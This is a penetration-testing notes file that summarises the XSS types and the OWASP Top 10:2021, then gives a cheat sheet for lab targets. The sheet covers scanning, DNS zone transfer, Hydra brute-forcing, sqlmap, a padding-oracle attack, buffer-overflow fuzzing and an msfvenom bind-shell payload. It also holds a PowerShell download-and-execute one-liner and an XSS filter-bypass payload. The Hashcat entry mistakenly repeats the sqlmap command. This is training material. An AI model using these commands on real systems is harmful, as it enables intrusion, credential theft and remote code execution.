# Web-Attacks

---

## RCE ~ Remote Code Executions
- **Web Shells**
- **Reverse Shells**

---

## XSS ~ Cross-Site Scripting 

> There are three major types of XSS Attacks:
- **DOM (Special)**
  - DOM XSS (Document Object Model-based Cross-site Scripting) uses the HTML environment to execute malicious javascript. <br> This type of attack commonly uses the <script></script> HTML tag.

- **Persistent (Server-side)**
  - Persistent XSS is javascript that is run when the server loads the page containing it. <br> These can occur when the server does not sanitise the user data when it is uploaded to a page. <br> These are commonly found on blog posts. 

- **Reflected (Client-side)**
  - Reflected XSS is javascript that is run on the client-side end of the web application. <br> These are most commonly found when the server doesn't sanitise search data. 

---

# [OWASP Top 10:2021](https://owasp.org/Top10/)
## Top 10 Web Application Security Risks

There are three new categories, four categories with naming and scoping changes, and some consolidation in the Top 10 for 2021.

![Mapping](https://github.com/OWASP/www-project-top-ten/blob/master/assets/images/mapping.png)

- [**A01:2021-Broken Access Control**](https://owasp.org/Top10/A01_2021-Broken_Access_Control/) 
  - moves up from the fifth position; 94% of applications were tested for some form of broken access control. 
  - The 34 Common Weakness Enumerations (CWEs) mapped to Broken Access Control had more occurrences in applications than any other category.

- [**A02:2021-Cryptographic Failures**](https://owasp.org/Top10/A02_2021-Cryptographic_Failures/) 
  - shifts up one position to #2, previously known as Sensitive Data Exposure, which was broad symptom rather than a root cause. 
  - The renewed focus here is on failures related to cryptography which often leads to sensitive data exposure or system compromise.

- [**A03:2021-Injection**](https://owasp.org/Top10/A03_2021-Injection/) 
  - slides down to the third position.  
  - 94% of the applications were tested for some form of injection, and the 33 CWEs mapped into this category have the second most occurrences in applications. 
  - Cross-site Scripting is now part of this category in this edition.

- [**A04:2021-Insecure Design**](https://owasp.org/Top10/A04_2021-Insecure_Design/) 
  - is a new category for 2021, with a focus on risks related to design flaws. 
  - If we genuinely want to "move left" as an industry, it calls for more use of threat modeling, secure design patterns and principles, and reference architectures.

- [**A05:2021-Security Misconfiguration**](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/) 
  - moves up from #6 in the previous edition; 90% of applications were tested for some form of misconfiguration. 
  - With more shifts into highly configurable software, it's not surprising to see this category move up. 
  - The former category for XML External Entities (XXE) is now part of this category.

- [**A06:2021-Vulnerable and Outdated Components**](https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/) 
  - was previously titled Using Components with Known Vulnerabilities and is #2 in the Top 10 community survey, but also had enough data to make the Top 10 via data analysis. 
  - This category moves up from #9 in 2017 and is a known issue that we struggle to test and assess risk. 
  - It is the only category not to have any Common Vulnerability and Exposures (CVEs) mapped to the included CWEs, so a default exploit and impact weights of 5.0 are factored into their scores.

- [**A07:2021-Identification and Authentication Failures**](https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/) 
  - was previously Broken Authentication and is sliding down from the second position, and now includes CWEs that are more related to identification failures. 
  - This category is still an integral part of the Top 10, but the increased availability of standardized frameworks seems to be helping.

- [**A08:2021-Software and Data Integrity Failures**](https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/) 
  - is a new category for 2021, focusing on making assumptions related to software updates, critical data, and CI/CD pipelines without verifying integrity.
  - One of the highest weighted impacts from Common Vulnerability and Exposures/Common Vulnerability Scoring System (CVE/CVSS) data mapped to the 10 CWEs in this category. 
  - Insecure Deserialization from 2017 is now a part of this larger category.

- [**A09:2021-Security Logging and Monitoring Failures**](https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/) 
  - was previously Insufficient Logging & Monitoring and is added from the industry survey (#3), moving up from #10 previously. 
  - This category is expanded to include more types of failures, is challenging to test for, and isn't well represented in the CVE/CVSS data. 
  - However, failures in this category can directly impact visibility, incident alerting, and forensics.

- [**A10:2021-Server-Side Request Forgery**](https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/) 
  - is added from the Top 10 community survey (#1). 
  - The data shows a relatively low incidence rate with above average testing coverage, along with above-average ratings for Exploit and Impact potential.
  -  This category represents the scenario where the security community members are telling us this is important, even though it's not illustrated in the data at this time.

---

# Cheat Sheets

General Cheat Sheet of often used commands

Enumeration
===========

### Masscan (local) :

    masscan -p1-65534 -rate=10000 -oG name.masscan 10.10.10.10
    

### Netdiscover :

    netdiscover -i eth0
    

### Nmap :

    nmap -A -p- -T4 -oA nmap/[name].xml 10.10.10.10
    nmap --script=vuln -T4 -oA nmap/[name].xml 10.10.10.10
    nmap -sC -sV --script-args http.useragent="Mozilla 42"
    
    xsltproc *.xml -o *.html
    

### Nikto :

    nikto -host 10.10.10.10[:8080] -output nikto.[name].txt
    # edit that line in /etc/nikto.conf for the user agent
    USERAGENT=Mozilla/5.00 (Nikto/@VERSION) (Evasions:@EVASIONS) (Test:@TESTID)
    

### DirSearch :

    /opt/dirsearch/dirsearch.py -u http://10.10.10.10 -e asp,aspx,bat,c,cfm,cgi,com,dll,exe,htm,html,inc,jhtml,jsa,jsp,log,mdb,nsf,php,phtml,pl,reg,sh,shtml,sql,txt,xml,/,js -x 403,400 --json-report=[/path/]dirsearch.json
    

### Gobuster :

    gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -b 400,404,500 -u http://10.10.10.10 -o [name].log -t 25 [-k] [-c cookie] [-a useragent]
    

### Dirb :

    dirb http://10.10.10.10[:8080] -o dirb.[name].txt
    

### Wfuzz :

    wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/megabeast.txt --hc 404,200 http://[ip:port]/FUZZ [ -b ‘cookie=value’ ] [ -w /usr/share/wordlist ]
    

### WPScan :

    wpscan --url http://10.10.10.10 -e vt -e vp -e u --user-agent --user-agent "Mozilla/5.0 (Windows NT 6.3; rv;36.0) Gecko/20100101 Firefox/36.0"
    

DNS
===

### Dig :

    dig axfr @10.10.10.13 cronos.htb
    

### host :

    host -t ns cronos.htb
    host -t mx cronos.htb
    

### dnsrecon :

    dnsrecon -d cronos.htb -t axfr
    

Brute Force
===========

### Hydra :

#### ssh :

    hydra -L login.txt -P pass.txt [ -c file (user:pass format) ] ssh://10.10.10.10[:port]
    

#### http-form-post :

    hydra [ip] -s [port] http-form-post "/index.php:password=^PASS^:F=Invalid\ password\!" -P [wordlist] -l '' {in this case no username -l ''} -t 10 -I
    

#### http-form-get :

#### smb :

    hydra -l cristal -x 4:4:a 192.168.2.46 smb
    

### Sqlmap :

    sqlmap -r admin.cronos.req --level 5 --risk 3 --threads 10
    

### Hashcat :

    sqlmap -r admin.cronos.req --level 5 --risk 3 --threads 10
    

Windows
=======

### PowerShell :

#### use file from the internet :

    IEX(New-Object Net.WebClient).downloadString(‘http://10.10.10.10:8080/shell.ps1’)
    

#### Privesc - MetaSploit :

    search suggest
    post/multi/recon/local_exploit_suggester
    set SESSION 1
    (powerup ?)
    

Shell :
-------

Database
========

### Cookie :

### padBuster :

    perl padBuster.pl http://10.10.10.10/index.php uBIcLBJyjARxQ7ooer8gpdI4sSUCfulk 8 auth=uBIcLBJyjARxQ7ooer8gpdI4sSUCfulk -plaintext user=admin
    

Monitoring
==========

### Network

#### netstat :

    watch "netstat -an | grep 4001"
    

#### lsof :

    watch "lsof -i 4001"
    

Buffer Overflow
===============

### Fuzzing :

    #!/usr/bin/env python
    
    import socket
    import time
    
    target_host = "127.0.0.1"
    target_port = 4030
    
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((target_host, target_port))
    
    for i in range(1,2000) :
    
        fuzz = "A" * i
        client.send(fuzz)
        response = client.recv(4096)
    
        print i
    #    client.send("x\n")
    #    response = client.recv(4096)
    
        time.sleep(0.1)
    
    client.send("x\n")
    response = client.recv(4096)
    
    print response
    

### Bad Characters :

    #!/usr/bin/env python
    
    shellcode = ''
    for i in range(1,256):
        shellcode += chr(i)
    
    print shellcode
    

### Format String :

Shows 20 dwords from the stack :

    for(( i=1; i < 20; i++)); do echo -n "$i " && ./fs "%$i\$x"; done
    

Use “%s” to retrieve strings instead :

    for(( i=1; i < 20; i++)); do echo -n "$i " && ./fs "%$i\$s"; done
    

MSFVenom :

    msfvenom -p linux/x86/shell_bind_tcp -b '\x00\x09\x10\x13' LPORT=4450 -f python
    

Unclassified
============

### JS Prompt :

Filters bypass

    <svg%0Ao%00nload=%09((pro\u006dpt))()//
    

  

### Vim :

record macro :

    q<letter><commands>q
    

execute macro :

    <number>@<letter>
    

re execute macro :

    @@
    

global switch :

    :%s/item1/item2/g
